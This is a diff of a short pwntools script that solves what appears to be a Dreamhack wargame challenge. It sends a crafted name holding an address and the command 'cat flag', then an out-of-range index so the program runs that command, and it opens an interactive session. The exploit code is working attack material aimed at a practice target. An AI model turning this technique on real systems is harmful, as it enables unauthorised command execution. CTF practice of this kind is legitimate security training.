@@ -1,19 +1,21 @@
 from pwn import *
-context.log_level='debug'
 
-n = remote('host1.dreamhack.games',8367)
+hosts = 'host1.dreamhack.games'
+port = 23261
+
+p = remote(hosts,port)
 
 name_addr = 0x804a0ac
-offset = '19' #name의 주소
 
-str_flag = 'cat flag'
+payload = p32(name_addr+0x4)
+payload += b'cat flag'
 
-payload1 = p32(name_addr+4)
-payload1 += str_flag.encode()
+index = '19'
 
-payload2 = offset
+p.recvuntil('Admin name: ')
+p.sendline(payload)
+p.recvuntil('What do you want?: ')
+p.sendline(index)
 
-n.sendafter('Admin name:',payload1)
-n.sendafter('What do you want?:',payload2)
 
-n.interactive()
+p.interactive()
